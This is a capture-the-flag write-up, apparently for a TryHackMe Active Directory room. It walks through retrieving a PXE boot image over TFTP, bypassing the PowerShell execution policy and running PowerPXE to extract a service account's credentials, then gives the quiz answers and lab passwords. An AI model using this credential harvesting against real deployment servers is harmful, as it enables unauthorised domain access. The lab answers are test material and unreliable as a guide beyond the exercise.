# Task 6 Microsoft Deployment Toolkit

Large organisations need tools to deploy and manage the infrastructure of the estate. In massive organisations, you can't have your IT personnel using DVDs or even USB Flash drives running around installing software on every single machine. Luckily, Microsoft already provides the tools required to manage the estate. However, we can exploit misconfigurations in these tools to also breach AD.

**MDT and SCCM**

MDT(Microsoft Deployment Toolkit) is a Microsoft service that assists with automating the deployment of Microsoft Operating Systems (OS). . Large organisations use services such as MDT to help deploy new images in their estate more efficiently since the base images can be maintained and updated in a central location.

SCCM(System Center Configuration Manage) is like a big brother after deploying the system the managment is done using the SCCM.

**PXE Boot**

Used by larger organization to allow new device that are connected to the network to load and isntall the OS directly.

The communication flow is shown in the diagram below:

![image](https://github.com/Theincognitomode/Breaching-Active-Directory-THM-Writeup/assets/73027020/bf78dd74-4683-422b-8581-34c6cc3ff137)

Follow the in the task in order to perform PXE Boot Image Retrieval

1. ssh the machine using the command(with password `Password1@` :

       ssh thm@THMJMP1.za.tryhackme.com
2. Follow these set of instructions :

       cd Documents
       mkdir <username>
       copy C:\powerpxe <username>\
       cd <username>

**Make sure to change the username pls**

3. Regarding this command make sure to change the  `\Tmp\x64{39...28}.bcd` with a valid file name from the website http://pxeboot.za.tryhackme.com/

       tftp -i <THMMDT IP> GET "\Tmp\x64{39...28}.bcd" conf.bcd

- In order to get the THMMDT ip type this command `nslookup thmmdt.za.tryhackme.com` or just scroll up to the top and check the ip of the machine over there.


If all the commands are executed without any fail then the shell should look something like this :

![Screenshot (367)](https://github.com/Theincognitomode/Breaching-Active-Directory-THM-Writeup/assets/73027020/525bdca9-1d16-4023-ba7f-0474a0a0c206)

4. Open the  powershell using the command :

       powershell -executionpolicy bypass

5. WIM files are bootable images in the Windows Imaging Format (WIM). Now that we have the location of the PXE Boot image, we can again use TFTP to download this image:

       tftp -i <THMMDT IP> GET "<PXE Boot Image Location>" pxeboot.wim

**Make sure to place the PXE boot image location..**

This command will take a around 3-4 mins..

After that execute this command :

     Get-FindCredentials -WimFile pxeboot.wim

Then scrap the image and this will be the output :


    Get-FindCredentials -WimFile .\pxeboot.wim
    >>>> Finding Bootstrap.ini 
    >>>> >>>> DeployRoot = \\THMMDT\MTDBuildLab$ 
    >>>> >>>> UserID = svcMDT
    >>>> >>>> UserDomain = ZA
    >>>> >>>> UserPassword = PXEBootSecure1@ `


Now lets answer the question :

**Q1. 
What Microsoft tool is used to create and host PXE Boot images in organisations?**

    Microsoft Deployment Toolkit

**Q2. What network protocol is used for recovery of files from the MDT server?**

    tftp


**Q3. What is the username associated with the account that was stored in the PXE Boot image?**

    svcMDT

**Q4. 
What is the password associated with the account that was stored in the PXE Boot image?**

    PXEBootSecure1@`

    
